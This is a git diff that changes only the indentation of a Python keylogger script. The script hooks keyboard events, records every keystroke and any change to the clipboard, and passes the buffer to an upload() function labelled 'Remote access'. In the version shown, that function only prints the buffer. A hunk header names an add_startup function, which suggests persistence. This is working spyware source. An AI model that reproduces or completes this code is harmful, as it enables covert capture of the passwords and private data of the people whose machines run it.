@@ -19,36 +19,36 @@ def add_startup():
 
 # Remote access
 def upload():
-	print(queue)
-		i = 0
-		queue = ""
+    print(queue)
+    i = 0
+    queue = ""
 
 
 # Process keys
 def process_event(e):
-	global i, queue, last_copied
-	i += 1
-	if e.event_type == "down":
-		if len(e.name) == 1:
-			queue += e.name
-		elif e.name == "space":
-			queue += " "
-		else:
-			queue += "\n[%s]" % e.name
+    global i, queue, last_copied
+    i += 1
+    if e.event_type == "down":
+        if len(e.name) == 1:
+            queue += e.name
+        elif e.name == "space":
+            queue += " "
+        else:
+            queue += "\n[%s]" % e.name
 
-	if pyperclip.paste() != last_copied:
-		queue += ' "%s" ' % pyperclip.paste()
-		last_copied = pyperclip.paste()
-		i += len(last_copied)
+    if pyperclip.paste() != last_copied:
+        queue += ' "%s" ' % pyperclip.paste()
+        last_copied = pyperclip.paste()
+        i += len(last_copied)
 
-	if i > 100:
-		upload()
+    if i > 100:
+        upload()
 
 
 def main():
-	keyboard.hook(process_event)
-	keyboard.wait()
+    keyboard.hook(process_event)
+    keyboard.wait()
 
 
 if __name__ == '__main__':
-	main()
+    main()
